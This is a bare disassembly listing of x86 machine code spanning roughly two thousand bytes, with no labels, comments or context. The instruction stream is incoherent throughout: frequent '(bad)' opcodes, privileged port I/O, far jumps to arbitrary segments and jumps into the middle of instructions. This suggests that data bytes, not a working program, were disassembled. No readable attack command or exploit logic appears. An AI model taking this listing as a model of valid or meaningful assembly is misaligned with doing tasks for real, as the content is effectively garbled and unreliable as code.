  414116:	fidivr DWORD PTR [esi-0x3]
  414119:	xchg   BYTE PTR [edi],dl
  41411b:	and    DWORD PTR [edx+0x56],0xffffffa8
  41411f:	lahf   
  414120:	out    0x5d,eax
  414122:	cmp    edi,eax
  414124:	adc    ebp,esp
  414126:	(bad)  [ecx-0x594d60ee]
  41412c:	jmp    0x7e68c748
  414131:	in     eax,dx
  414132:	mov    edi,DWORD PTR [esi]
  414134:	pop    ds
  414135:	out    0x79,al
  414137:	sbb    DWORD PTR [bx+0x44],0xd79a01c0
  41413f:	and    BYTE PTR [ebp-0x4a],ah
  414142:	push   edx
  414143:	sbb    edi,DWORD PTR [ebx]
  414145:	pop    ds
  414146:	sbb    eax,0x3a5b3132
  41414b:	and    BYTE PTR [ebp-0x4f],bh
  41414e:	adc    ch,al
  414150:	aam    0x54
  414152:	test   cl,al
  414154:	xchg   esp,eax
  414155:	push   esi
  414156:	popf   
  414157:	test   eax,0xb3345750
  41415c:	data16 jecxz 0x4141b4
  41415f:	(bad)  ds:0x7455a366
  414165:	call   0xddf9:0x5a0e51d8
  41416c:	les    eax,FWORD PTR [ebp+0x1]
  41416f:	xchg   esp,eax
  414170:	aad    0x72
  414172:	gs and eax,0x1b28b6c1
  414178:	addr16 lock mov dl,0xb2
  41417c:	xchg   eax,ecx
  41417e:	arpl   WORD PTR [esi+0x55],bx
  414181:	fsub   st,st(1)
  414183:	inc    ebx
  414184:	mov    bl,bl
  414186:	add    al,dh
  414188:	sub    al,0x7e
  41418a:	add    BYTE PTR [esi+0x7a9d3166],ah
  414190:	jns    0x414155
  414192:	std    
  414193:	or     ah,BYTE PTR [ebp-0x5c64635b]
  414199:	imul   cl
  41419b:	inc    ecx
  41419c:	sub    eax,0xd
  41419f:	inc    ebx
  4141a0:	pop    ebx
  4141a1:	(bad)  [eax]
  4141a3:	jmp    0xb610db93
  4141a8:	int    0xc0
  4141aa:	mov    ebp,0xbc8de1d3
  4141af:	sbb    dh,BYTE PTR [eax+0x5b]
  4141b2:	jp     0x41420b
  4141b4:	mov    ds:0x575d2bea,al
  4141b9:	loope  0x41416c
  4141bb:	pop    ebx
  4141bc:	lahf   
  4141bd:	pop    esi
  4141be:	cs mov ah,bh
  4141c1:	mov    dh,0x57
  4141c3:	sbb    bh,BYTE PTR cs:[ebx]
  4141c6:	scas   eax,DWORD PTR es:[edi]
  4141c7:	leave  
  4141c8:	cli    
  4141c9:	or     al,0x8e
  4141cb:	mov    ds:0x52051631,eax
  4141d0:	mov    BYTE PTR [ebx-0x61],bh
  4141d3:	pusha  
  4141d4:	and    eax,0x8dace478
  4141d9:	push   ebx
  4141da:	jbe    0x41419f
  4141dc:	(bad)  
  4141dd:	das    
  4141de:	mov    ah,0x9c
  4141e0:	fs inc ecx
  4141e2:	daa    
  4141e3:	xor    esp,DWORD PTR [ebx+0x7a]
  4141e6:	xor    DWORD PTR [edx+0xd],ebx
  4141e9:	or     al,0x20
  4141eb:	ss pop ebp
  4141ed:	les    ebx,FWORD PTR [edx+ebp*8-0x45632405]
  4141f4:	fadd   DWORD PTR [edi+eiz*8]
  4141f7:	jl     0x414262
  4141f9:	sub    eax,0x2cf4885b
  4141fe:	inc    edx
  4141ff:	sahf   
  414200:	loopne 0x4141f8
  414202:	repz repz dec ebx
  414205:	fstp   DWORD PTR [ebx]
  414207:	or     BYTE PTR [edi],al
  414209:	dec    ebp
  41420a:	clc    
  41420b:	and    DWORD PTR [ecx-0xd37bf42],esp
  414211:	or     al,0x8f
  414213:	adc    al,0xda
  414215:	das    
  414216:	push   edx
  414217:	or     ch,cl
  414219:	mov    dh,0xa6
  41421b:	(bad)  [ecx+0x59ccaeb]
  414221:	movd   mm5,esp
  414224:	shl    BYTE PTR [ecx],1
  414226:	fsubr  st,st(6)
  414228:	push   0xd9e8df16
  41422d:	shl    esp,0xc3
  414230:	sahf   
  414231:	cmp    ecx,DWORD PTR ds:0x50ae5ba2
  414237:	jb     0x414270
  414239:	enter  0x632d,0x79
  41423d:	imul   esi,DWORD PTR [ebp+0x5337fdc6],0xc6277915
  414247:	cs xchg esi,eax
  414249:	imul   esi,DWORD PTR [ecx+0x4bdf53ab],0xef21c7d
  414253:	cli    
  414254:	or     DWORD PTR [edi+0x1b],ebx
  414257:	sbb    dh,bl
  414259:	dec    eax
  41425a:	in     eax,0xa8
  41425c:	pushf  
  41425d:	leave  
  41425e:	imul   edi,DWORD PTR [ecx+0x67],0x46
  414262:	dec    ecx
  414263:	sbb    dl,BYTE PTR [ecx-0x6bbca0f1]
  414269:	ret    
  41426a:	mov    BYTE PTR [edx+0x58],ah
  41426d:	mov    ebp,0xc1610780
  414272:	and    ah,ch
  414274:	sbb    al,0x7
  414276:	xor    eax,0xd8dcd454
  41427b:	push   ebx
  41427c:	mov    ebx,0x5c14ddc6
  414281:	push   cs
  414282:	scas   al,BYTE PTR es:[edi]
  414283:	mov    esp,0x66aba06b
  414288:	dec    edi
  414289:	mov    edi,0x792ed35d
  41428e:	adc    eax,0x735f459e
  414293:	jle    0x414284
  414295:	sub    bl,BYTE PTR ss:[eax]
  414298:	jo     0x4142cf
  41429a:	adc    DWORD PTR [edx-0x76ce7123],edi
  4142a0:	cmp    al,0xe8
  4142a2:	int    0x38
  4142a4:	hlt    
  4142a5:	test   DWORD PTR [ecx+0x1],esp
  4142a8:	jnp    0x41429e
  4142aa:	xchg   edx,eax
  4142ab:	call   0x1390196a
  4142b0:	sub    esp,edi
  4142b2:	jo     0x414236
  4142b4:	dec    ecx
  4142b5:	push   edi
  4142b6:	lods   al,BYTE PTR ds:[esi]
  4142b7:	je     0x4142b5
  4142b9:	ins    BYTE PTR es:[edi],dx
  4142ba:	push   ebx
  4142bb:	and    cl,BYTE PTR [ecx+0x49c9251a]
  4142c1:	aaa    
  4142c2:	leave  
  4142c3:	ins    DWORD PTR es:[edi],dx
  4142c4:	ret    0x50c1
  4142c7:	int3   
  4142c8:	cmp    eax,0xbd2193f3
  4142cd:	(bad)  
  4142ce:	int    0x3e
  4142d0:	nop
  4142d1:	mov    al,0x25
  4142d3:	or     eax,0x717589f
  4142d8:	or     ebp,DWORD PTR [edi-0x389e2289]
  4142de:	sti    
  4142df:	loope  0x414309
  4142e1:	mov    WORD PTR [edi-0x4a59b2e7],?
  4142e7:	add    eax,DWORD PTR [edi]
  4142e9:	cs mov eax,fs
  4142ec:	jmp    0x4142e2
  4142ee:	cmp    ch,bl
  4142f0:	call   0xb756ad4b
  4142f5:	pop    edi
  4142f6:	xchg   esi,eax
  4142f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f8:	icebp  
  4142f9:	xor    eax,0xce919457
  4142fe:	inc    ebx
  4142ff:	pop    ds
  414300:	push   edi
  414301:	pop    edi
  414302:	arpl   WORD PTR [ebx+0x5f],si
  414305:	retf   0x28e5
  414308:	enter  0xcf45,0xfd
  41430c:	push   cs
  41430d:	inc    ecx
  41430e:	dec    esp
  41430f:	cli    
  414310:	inc    ebx
  414311:	js     0x4142d7
  414313:	dec    ebx
  414314:	or     dl,BYTE PTR [ebx+0x569374b2]
  41431a:	fdiv   QWORD PTR [edi-0x30]
  41431d:	mov    ebp,0x4bb1b1c9
  414322:	add    dh,ch
  414324:	inc    edi
  414325:	sub    DWORD PTR ss:[edi+ebx*4],0xffffffe7
  41432a:	inc    edx
  41432b:	xor    dh,ch
  41432d:	mov    eax,ds:0x767f90a6
  414332:	out    0xea,al
  414334:	aas    
  414335:	push   0x1683be34
  41433a:	xor    DWORD PTR [ebx-0x3b08f93d],edx
  414340:	jae    0x414381
  414342:	push   esi
  414343:	test   eax,0x51fccae8
  414348:	cmp    bl,BYTE PTR [eax+eiz*8]
  41434b:	cmp    ecx,DWORD PTR [esi]
  41434d:	leave  
  41434e:	scas   al,BYTE PTR es:[edi]
  41434f:	pop    ss
  414350:	call   0x51c6aec8
  414355:	add    edi,ebp
  414357:	stos   DWORD PTR es:[edi],eax
  414358:	cmc    
  414359:	sub    eax,0x535d35f8
  41435e:	pop    ebx
  41435f:	sahf   
  414360:	into   
  414361:	lock pop eax
  414363:	fdiv   st(5),st
  414365:	test   edi,ebp
  414367:	fcmovnu st,st(3)
  414369:	pop    ss
  41436a:	sub    DWORD PTR [ecx],esi
  41436c:	fdivr  QWORD PTR [esi]
  41436e:	(bad)  
  41436f:	in     al,dx
  414370:	jmp    0x414349
  414372:	xchg   edx,eax
  414373:	stc    
  414374:	leave  
  414375:	pop    ds
  414376:	sbb    esi,DWORD PTR [ecx+0x38]
  414379:	push   0x24771f11
  41437e:	jp     0x41438d
  414380:	or     ecx,DWORD PTR [edx+0x48]
  414383:	out    0xd,al
  414385:	inc    eax
  414386:	and    DWORD PTR [eax+0x6067eac8],ecx
  41438c:	cs pop edx
  41438e:	popa   
  41438f:	repz fwait
  414391:	push   esi
  414392:	mov    bl,0xa6
  414394:	stc    
  414395:	sbb    cl,BYTE PTR [ecx+0x87a9630]
  41439b:	inc    esi
  41439c:	jne    0x414367
  41439e:	xchg   BYTE PTR [edx+0x17b42f8b],bl
  4143a4:	clc    
  4143a5:	sbb    BYTE PTR [edi],ch
  4143a7:	xchg   ebx,eax
  4143a8:	(bad)  
  4143a9:	xor    BYTE PTR [ecx],cl
  4143ab:	sub    edi,DWORD PTR [edi-0x64f4d59b]
  4143b1:	mov    bl,BYTE PTR [ecx+0x5]
  4143b4:	shr    BYTE PTR [ebx],0x9e
  4143b7:	(bad)  
  4143b8:	movhps QWORD PTR ds:0xf175d2cc,xmm6
  4143bf:	pushf  
  4143c0:	call   0x2c47:0x99fce1dd
  4143c7:	icebp  
  4143c8:	dec    esi
  4143c9:	test   eax,0x54599b11
  4143ce:	mov    eax,?
  4143d0:	pop    ebp
  4143d1:	dec    esp
  4143d2:	aad    0x45
  4143d4:	data16 sti 
  4143d6:	test   edi,edx
  4143d8:	jecxz  0x414457
  4143da:	jne    0x41439c
  4143dc:	pop    ecx
  4143dd:	fwait
  4143de:	add    edx,DWORD PTR [edx+0x2d]
  4143e1:	adc    ebp,DWORD PTR [eax+0x7126819]
  4143e7:	pop    edi
  4143e8:	mov    eax,0xe2daa906
  4143ed:	pop    ecx
  4143ee:	or     ecx,DWORD PTR [ebp+0x6b4c73de]
  4143f4:	pop    esi
  4143f5:	mov    ebx,DWORD PTR [esi+0x76bfbef1]
  4143fb:	leave  
  4143fc:	mov    dh,bh
  4143fe:	cs push esp
  414400:	in     al,dx
  414401:	push   0x23
  414403:	fwait
  414404:	inc    edi
  414405:	mov    fs,WORD PTR [ecx]
  414407:	push   cs
  414408:	mov    bl,0xe0
  41440a:	inc    edi
  41440b:	adc    BYTE PTR [edi+ecx*4-0x159da9a5],dl
  414412:	cs dec edx
  414414:	fwait
  414415:	push   ss
  414416:	mov    dh,BYTE PTR [esp+edx*4]
  414419:	jns    0x4143ac
  41441b:	adc    dl,BYTE PTR [ebp-0x36]
  41441e:	mov    ebp,0x8b12b503
  414423:	fprem1 
  414425:	or     DWORD PTR [edx-0x109bf86c],0xd424c0cf
  41442f:	mov    edi,0x2c59b748
  414434:	hlt    
  414435:	or     ch,ah
  414437:	xchg   ebp,eax
  414439:	pop    ebx
  41443a:	into   
  41443b:	inc    esi
  41443c:	les    ebx,FWORD PTR [edx*2+0x19fbb421]
  414443:	xor    BYTE PTR [ebp-0xa],bh
  414446:	sbb    ebp,0x9fdf4d88
  41444c:	out    0xb4,eax
  41444e:	in     al,0xbc
  414450:	dec    ebp
  414451:	popf   
  414452:	cmp    ecx,DWORD PTR [ebp+0x55]
  414455:	mov    al,0x26
  414457:	add    edx,eax
  414459:	in     eax,0xfc
  41445b:	xchg   DWORD PTR [esi],esp
  41445d:	aad    0xed
  41445f:	fisttp QWORD PTR [edx+esi*2]
  414462:	adc    eax,0x9a1890c5
  414467:	xchg   esp,eax
  414468:	ret    0x2056
  41446b:	mul    BYTE PTR [di-0x1f81]
  414470:	fistp  DWORD PTR [ebx-0x28]
  414473:	pop    eax
  414474:	into   
  414475:	mov    eax,ds:0x5a82fb9b
  41447a:	retf   0x7e74
  41447d:	inc    ecx
  41447e:	cwde   
  41447f:	mov    ch,0x9
  414481:	xor    ebp,esi
  414483:	adc    eax,0xadbd7b92
  414488:	or     eax,0x894c0377
  41448d:	adc    DWORD PTR [ebp+edi*8-0x12],ebp
  414491:	and    esp,DWORD PTR [edi+0x18677d60]
  414497:	fst    DWORD PTR [eax]
  414499:	push   ebx
  41449a:	and    bh,dl
  41449c:	es inc ebp
  41449e:	ins    BYTE PTR es:[edi],dx
  41449f:	mov    eax,ds:0x9d2c4084
  4144a4:	xchg   esi,eax
  4144a5:	cld    
  4144a6:	pop    eax
  4144a7:	sbb    BYTE PTR [ebp+0x6fc9c413],bl
  4144ad:	dec    ebx
  4144ae:	or     esi,0x9
  4144b1:	addr16 sub eax,0xd97cfad1
  4144b7:	in     eax,0xf5
  4144b9:	sub    esi,DWORD PTR ds:0x327967ce
  4144bf:	sahf   
  4144c0:	popa   
  4144c1:	clc    
  4144c2:	push   ebp
  4144c3:	sub    BYTE PTR [esi-0x5f],bl
  4144c6:	leave  
  4144c7:	fsubr  DWORD PTR [esi-0xf]
  4144ca:	hlt    
  4144cb:	retf   0x3fca
  4144ce:	dec    edx
  4144cf:	daa    
  4144d0:	sub    BYTE PTR [esp+eax*8-0x50],cl
  4144d4:	rcr    DWORD PTR [esi],cl
  4144d6:	mov    al,0x5b
  4144d8:	push   edi
  4144d9:	and    al,0xdc
  4144db:	mov    edi,ds
  4144dd:	and    dl,BYTE PTR [edx+0x43]
  4144e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144e1:	xchg   ebx,eax
  4144e2:	push   es
  4144e3:	or     BYTE PTR [eax],al
  4144e5:	int    0x46
  4144e7:	push   0xd3c0c6bf
  4144ec:	call   0x2b690d82
  4144f1:	push   0x85ab0e26
  4144f6:	dec    edx
  4144f7:	xchg   edi,eax
  4144f8:	and    eax,0xfd57c05f
  4144fd:	push   ecx
  4144fe:	loope  0x414505
  414500:	mov    al,0xf7
  414502:	retf   0x98f6
  414505:	jg     0x41457b
  414507:	out    0xfb,al
  414509:	pusha  
  41450a:	mov    bh,BYTE PTR [ebx]
  41450c:	jb     0x4144a9
  41450e:	inc    edx
  41450f:	rol    BYTE PTR [edx],cl
  414511:	and    eax,0xde90d137
  414516:	jns    0x4144f6
  414518:	inc    ebx
  414519:	cmp    BYTE PTR [edx+0x27],0xb2
  41451d:	dec    esp
  41451e:	loope  0x41451a
  414520:	stos   DWORD PTR es:[edi],eax
  414521:	inc    esi
  414522:	fs scas eax,DWORD PTR es:[edi]
  414524:	stos   BYTE PTR es:[edi],al
  414525:	lahf   
  414526:	mov    eax,ds:0xad05e904
  41452b:	add    al,0x6e
  41452d:	retf   
  41452e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41452f:	push   0x6e4f7f1c
  414534:	push   cs
  414535:	gs (bad) 
  414537:	in     eax,0xd2
  414539:	jl     0x4144cd
  41453b:	mov    al,0x31
  41453d:	loope  0x414508
  41453f:	adc    eax,0x3b0ad474
  414544:	shl    BYTE PTR [eax+edx*2],cl
  414547:	inc    eax
  414548:	mov    ebx,0x28b94c64
  41454d:	fisttp DWORD PTR [ecx+ecx*1-0x46f343c8]
  414554:	jns    0x4145bb
  414556:	sub    ah,BYTE PTR [ebx+ecx*1+0x6d75580d]
  41455d:	loopne 0x414570
  41455f:	sbb    dl,BYTE PTR [edi]
  414561:	mov    eax,ds:0x8cb4a556
  414566:	aaa    
  414567:	std    
  414568:	push   esp
  414569:	loope  0x41457e
  41456b:	or     BYTE PTR [ebx-0x1310938e],0x45
  414572:	ja     0x4145da
  414574:	shl    BYTE PTR [eax+0x663e1a46],1
  41457a:	inc    ebp
  41457b:	mov    edx,0xdd231845
  414580:	outs   dx,DWORD PTR ds:[esi]
  414581:	outs   dx,BYTE PTR ds:[esi]
  414582:	or     BYTE PTR [ecx-0x2f],ah
  414585:	xor    al,0x60
  414587:	scas   eax,DWORD PTR es:[edi]
  414588:	imul   ebp,DWORD PTR ds:0xe11095e7,0x2b
  41458f:	hlt    
  414590:	pop    edx
  414591:	jns    0x4145e5
  414593:	ss cmp al,0x5e
  414596:	leave  
  414597:	xlat   BYTE PTR ds:[ebx]
  414598:	fiadd  DWORD PTR es:[ecx+0x497d8aa2]
  41459f:	adc    eax,0x8daf2250
  4145a4:	xchg   ax,ax
  4145a6:	iret   
  4145a7:	out    dx,eax
  4145a8:	fsub   QWORD PTR [esi+0x39]
  4145ab:	aad    0x62
  4145ad:	call   0x60d7c27f
  4145b2:	shr    BYTE PTR [ebp-0x2a6e08fc],0xe0
  4145b9:	iret   
  4145ba:	pusha  
  4145bb:	frstor [eax+0x18]
  4145be:	or     eax,0x3240405c
  4145c3:	mov    ch,0x25
  4145c5:	xchg   ecx,eax
  4145c6:	sub    DWORD PTR [edx-0x3e66bce3],esp
  4145cc:	cmc    
  4145cd:	pop    ecx
  4145ce:	or     eax,0xd2641d8c
  4145d3:	scas   eax,DWORD PTR es:[edi]
  4145d4:	mov    ds:0x1df58e2c,al
  4145d9:	jne    0x4145c2
  4145db:	sbb    al,0xb2
  4145dd:	retf   0x4665
  4145e0:	push   ss
  4145e1:	sbb    esp,ecx
  4145e3:	and    BYTE PTR [edi+0x5c],dh
  4145e6:	(bad)  
  4145e7:	pop    edi
  4145e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145e9:	aad    0xf4
  4145eb:	dec    ecx
  4145ec:	dec    ebp
  4145ed:	push   ss
  4145ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145ef:	jp     0x414638
  4145f1:	fidiv  DWORD PTR [ebx+0x39631043]
  4145f7:	or     eax,0x3519127d
  4145fc:	xchg   ebp,eax
  4145fd:	pop    edi
  4145fe:	rol    DWORD PTR [eax+0x391b8c8],0xcd
  414605:	mov    eax,edx
  414607:	dec    eax
  414608:	lods   al,BYTE PTR ds:[esi]
  414609:	daa    
  41460a:	inc    ecx
  41460b:	lea    ebx,[ebp+edi*8+0x9a36894]
  414612:	xchg   ecx,eax
  414613:	pop    ds
  414614:	out    dx,eax
  414615:	adc    BYTE PTR [esi+0x27c9a227],0x40
  41461c:	into   
  41461d:	xor    dl,ah
  41461f:	out    dx,eax
  414620:	or     DWORD PTR [ecx-0x3258dfff],esp
  414626:	dec    esp
  414627:	sub    BYTE PTR [ebx+0xda1160a],bl
  41462d:	cmp    al,0x88
  41462f:	add    al,0x6b
  414631:	mov    ah,0xd2
  414633:	loopne 0x4145db
  414635:	and    bh,dl
  414637:	cmp    BYTE PTR [ebp-0x5bdd1a2d],bh
  41463d:	and    al,0xdf
  41463f:	les    ebp,FWORD PTR [esi]
  414641:	(bad)  
  414642:	fisub  DWORD PTR [eax-0x30]
  414645:	cmp    al,0xe
  414647:	dec    ecx
  414648:	idiv   BYTE PTR [ebx]
  41464a:	aam    0x23
  41464c:	fbld   TBYTE PTR [ebp-0x1d1365e6]
  414652:	out    dx,eax
  414653:	inc    ebx
  414654:	test   DWORD PTR [edx-0x44],ebx
  414657:	mul    BYTE PTR fs:[ecx]
  41465a:	push   esp
  41465b:	in     eax,0x88
  41465d:	aad    0x3c
  41465f:	std    
  414660:	vmptrst QWORD PTR [edi-0x405e2cc1]
  414667:	jg     0x414612
  414669:	xchg   esi,eax
  41466a:	cs aad 0x99
  41466d:	pop    ebp
  41466e:	pop    ecx
  41466f:	in     eax,dx
  414670:	fsubr  DWORD PTR [edx-0xe]
  414673:	outs   dx,DWORD PTR ds:[esi]
  414674:	sub    BYTE PTR [eax],0xb1
  414677:	ins    BYTE PTR es:[edi],dx
  414678:	and    al,0xd4
  41467a:	loope  0x4146c3
  41467c:	into   
  41467d:	jno    0x414650
  41467f:	mov    eax,ds:0xa124bc33
  414684:	addr16 loope 0x41463d
  414687:	inc    edx
  414688:	xor    edi,DWORD PTR [edx+0x61fb4794]
  41468e:	and    al,0xce
  414690:	ja     0x414634
  414692:	mov    dl,0x74
  414694:	lahf   
  414695:	call   FWORD PTR [ebx+edi*4]
  414698:	lock push cs
  41469a:	lds    ebx,FWORD PTR [esi-0x5632e51f]
  4146a0:	lahf   
  4146a1:	mov    ds:0x132b5935,al
  4146a6:	imul   edi,DWORD PTR [edi-0xd],0x38
  4146aa:	xor    DWORD PTR [edx],ecx
  4146ac:	xchg   BYTE PTR [esi-0x6fa93d4b],ch
  4146b2:	test   eax,0x2732d27b
  4146b7:	dec    edi
  4146b8:	in     eax,0xbf
  4146ba:	sti    
  4146bb:	stos   DWORD PTR es:[edi],eax
  4146bc:	sar    BYTE PTR es:[ecx-0x131c4208],1
  4146c3:	sub    ebx,edi
  4146c5:	lods   al,BYTE PTR ds:[esi]
  4146c6:	shl    ch,0xc7
  4146c9:	sbb    DWORD PTR [ebx+0x2a36991d],ebp
  4146cf:	sbb    dh,al
  4146d1:	add    edi,DWORD PTR [ecx+0x20810c8c]
  4146d7:	sub    DWORD PTR [edx],esi
  4146d9:	pop    ebp
  4146db:	dec    ecx
  4146dc:	and    edi,DWORD PTR [esi+0x6d]
  4146df:	mov    al,0xd4
  4146e1:	sbb    DWORD PTR [ecx],0x4f23e173
  4146e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146e8:	dec    ebx
  4146e9:	add    al,0xa8
  4146eb:	jle    0x414703
  4146ed:	mov    dl,0x37
  4146ef:	imul   edi,DWORD PTR [ebp-0x5400d057],0xffffffb6
  4146f6:	repz fsub st,st(0)
  4146f9:	mov    edi,0x599e1e1e
  4146fe:	push   ecx
  4146ff:	cmp    esi,DWORD PTR [esi+0x300ea7d9]
  414705:	je     0x414688
  414707:	int    0xdf
  414709:	ret    0x2451
  41470c:	push   ebp
  41470d:	out    0xd2,eax
  41470f:	lock (bad) 
  414711:	imul   DWORD PTR [ecx+0x14]
  414714:	xchg   esp,eax
  414715:	jbe    0x414707
  414717:	mov    cs,WORD PTR [ebp+0x4c]
  41471a:	call   0x770d998f
  41471f:	push   ebp
  414720:	sar    BYTE PTR [eax+eax*4-0x71],cl
  414724:	and    DWORD PTR [esi],0xfa0c83c2
  41472a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41472b:	xchg   edi,eax
  41472c:	adc    eax,0x6ef721e1
  414731:	jmp    0x41479d
  414733:	cmp    DWORD PTR [edx],ebp
  414735:	jmp    0x9f80:0x84627419
  41473c:	xor    BYTE PTR [ebp+ebp*2+0x1],dl
  414740:	mov    ds:0x43aff30b,al
  414745:	xchg   esp,eax
  414746:	lock imul edi,DWORD PTR [ebp-0x78],0xee9cdc5f
  41474e:	shr    BYTE PTR [ebx-0x5f],0x27
  414752:	test   ch,bl
  414754:	fbld   TBYTE PTR [edi-0x42]
  414757:	adc    bl,cl
  414759:	xchg   ebx,eax
  41475a:	stos   DWORD PTR es:[edi],eax
  41475b:	adc    DWORD PTR [esi],esp
  41475d:	shr    DWORD PTR [edi-0x435e4a79],0xf7
  414764:	lods   al,BYTE PTR ds:[esi]
  414765:	sub    DWORD PTR [eax],ebx
  414767:	mov    dh,BYTE PTR [edx-0x18ec0c39]
  41476d:	add    bh,bl
  41476f:	inc    edi
  414770:	aaa    
  414771:	or     al,0x2a
  414773:	imul   ebx,ebp,0x47
  414776:	not    DWORD PTR [eax]
  414778:	mul    BYTE PTR ds:0xb7b53625
  41477e:	es pop ss
  414780:	xchg   ebx,eax
  414781:	div    BYTE PTR [edi+0x197690a8]
  414787:	pop    esi
  414788:	cmp    DWORD PTR [eax+0x3],ebx
  41478b:	pop    ss
  41478c:	or     edx,DWORD PTR [ebx+0x16]
  41478f:	dec    edx
  414790:	adc    al,BYTE PTR [eax]
  414792:	cld    
  414793:	push   ss
  414794:	xchg   esi,eax
  414795:	mov    al,BYTE PTR [esi+0x58508b28]
  41479b:	add    al,0xf0
  41479d:	sub    eax,0x3411a7e0
  4147a2:	mov    esi,0xa70f30db
  4147a7:	ror    BYTE PTR [ebx],0xaa
  4147aa:	xor    ecx,eax
  4147ac:	dec    BYTE PTR [edx-0x65]
  4147af:	test   al,0x2f
  4147b1:	in     eax,0xf3
  4147b3:	loop   0x414741
  4147b5:	(bad)  
  4147b6:	addr16 xor al,0x21
  4147b9:	push   ebp
  4147ba:	xor    esi,DWORD PTR [eax-0x28668836]
  4147c0:	push   0xffffffce
  4147c2:	mov    al,ds:0x10f1fb16
  4147c7:	mov    ?,ebp
  4147c9:	adc    DWORD PTR [edi],ebp
  4147cb:	jne    0x414773
  4147cd:	cmp    eax,0xf961fe25
  4147d2:	scas   eax,DWORD PTR es:[edi]
  4147d3:	dec    esp
  4147d4:	mov    edx,esi
  4147d6:	sub    eax,0x4d319cc
  4147db:	lea    eax,[ecx+0x7e]
  4147de:	inc    eax
  4147df:	ror    DWORD PTR [edi+0x27],1
  4147e2:	jmp    0xab80:0xfba399a1
  4147e9:	pop    ss
  4147ea:	js     0x41484d
  4147ec:	sbb    esp,esi
  4147ee:	jle    0x414860
  4147f0:	in     eax,0x51
  4147f2:	xor    ecx,DWORD PTR [eax-0x3003e953]
  4147f8:	jo     0x414871
  4147fa:	adc    al,0x2
  4147fc:	loopne 0x4147bd
  4147fe:	jl     0x4147f5
  414800:	mov    ?,ebp
  414802:	je     0x4147a5
  414804:	xor    edi,DWORD PTR [ecx+0x11]
  414807:	push   0xbf07274b
  41480c:	test   eax,0xeacd7f85
  414811:	cs mov cl,0xae
  414814:	pop    ebx
  414815:	enter  0x78f4,0xf5
  414819:	mov    ds,WORD PTR [ebp-0x4689da06]
  41481f:	xchg   DWORD PTR [esi],edi
  414821:	push   es
  414822:	in     al,dx
  414823:	inc    esp
  414824:	pop    es
  414825:	(bad)  
  414827:	mov    dh,0xb9
  414829:	adc    eax,esi
  41482b:	popa   
  41482c:	loopne 0x414803
  41482e:	pop    edx
  41482f:	jae    0x4147db
  414831:	jle    0x414894
  414833:	sub    eax,0xc41995da
  414838:	xchg   ebp,eax
  414839:	mov    ds:0xa1a2717,al
  41483e:	pushf  
  41483f:	popa   
  414840:	sub    al,0xe8
  414842:	add    DWORD PTR [ecx+ebx*4],esp
  414845:	sub    al,0xcc
  414847:	cmp    DWORD PTR [edx+0x26],ecx
  41484a:	fmul   DWORD PTR [ebx]
  41484c:	and    al,0x7f
  41484e:	fcmovnu st,st(1)
  414850:	fidivr DWORD PTR [esi]
  414852:	pop    edx
  414853:	in     al,dx
  414854:	jmp    0x7dffa75c
  414859:	ins    BYTE PTR es:[edi],dx
  41485a:	cwde   
  41485b:	sbb    DWORD PTR [ebx],0xcf5a772e
  414861:	sar    ebx,cl
  414863:	loopne 0x414875
  414865:	test   al,0xf0
  414867:	sbb    DWORD PTR [ebx],ebx
  414869:	pop    es
  41486a:	(bad)  
  41486b:	push   edi
  41486c:	or     eax,0x2f90495
  414871:	sbb    DWORD PTR [ebx],ebp
  414873:	shl    cl,0x39
  414876:	or     edi,DWORD PTR [eax+0x19]
  414879:	scas   eax,DWORD PTR es:[edi]
  41487a:	and    bh,bh
  41487c:	fst    st(2)
  41487e:	mov    cl,0xbd
  414880:	outs   dx,DWORD PTR ds:[esi]
  414881:	lds    esp,FWORD PTR [eax]
  414883:	fsubr  QWORD PTR [ecx+0x5f19bac9]
  414889:	neg    BYTE PTR [ebx+0x14f879d1]
  41488f:	in     al,0xe9
  414891:	arpl   WORD PTR [ebx+0x35],bx
  414894:	aam    0x94
  414896:	pop    es
  414897:	divps  xmm2,XMMWORD PTR [ebx]
  41489a:	in     eax,dx
  41489b:	dec    edx
  41489c:	sbb    eax,0x384cf9ad
  4148a1:	inc    esp
  4148a2:	push   ebp
  4148a3:	iret   
  4148a4:	sub    BYTE PTR [esi-0x17],bl
  4148a7:	cmp    BYTE PTR [ebx+ebp*2-0x4b],cl
  4148ab:	inc    esi
  4148ac:	jnp    0x414912
  4148ae:	push   ebx
  4148af:	aad    0x30
  4148b1:	adc    DWORD PTR [edi+0x2bcfaab4],ebx
  4148b7:	sbb    DWORD PTR [ebx-0x18],edx
  4148ba:	stc    
  4148bb:	jmp    0x6cbe0002
  4148c0:	inc    edx
  4148c1:	jg     0x41491e
  4148c3:	pop    edi
  4148c4:	mov    ds:0xdcad7554,eax
  4148c9:	fild   QWORD PTR [ecx-0x59]
  4148cc:	sub    DWORD PTR [edi+0x624f76fa],eax
  4148d2:	adc    edx,DWORD PTR [edi]
  4148d4:	push   ecx
  4148d5:	and    bh,BYTE PTR [esi+ecx*1-0x682c154c]
  4148dc:	sub    edx,DWORD PTR [eax]
  4148de:	xor    DWORD PTR [edx+0x12],esp
  4148e1:	les    edx,FWORD PTR [edi+0x51fdb56f]
  4148e7:	ds mov esp,0x2fa8a6b3
  4148ed:	adc    al,0x68
  4148ef:	jns    0x41491c
  4148f1:	in     al,dx
  4148f2:	jecxz  0x414874
  4148f4:	lods   eax,DWORD PTR ds:[esi]
  4148f5:	jg     0x41487a
  4148f7:	jge    0x414960
  4148f9:	push   ecx
  4148fa:	inc    ebx
  4148fb:	adc    al,0xb1
  4148fd:	nop
  4148fe:	cmp    BYTE PTR ds:0x42569b4b,dh
  414904:	in     al,dx
  414905:	hlt    
  414906:	sahf   
  414907:	push   edx
  414908:	loop   0x4148f0
  41490a:	mov    ecx,0xcbc1d86b
  41490f:	(bad)  
  414910:	iret   
  414911:	mov    dh,dh
  414913:	xor    DWORD PTR [esi],0xe5254639
  414919:	inc    edx
  41491a:	sub    BYTE PTR [edi+0x67c1eff1],ah
  414920:	sti    
  414921:	cld    
  414922:	ins    BYTE PTR es:[edi],dx
  414923:	outs   dx,BYTE PTR ds:[esi]
  414924:	push   ebp
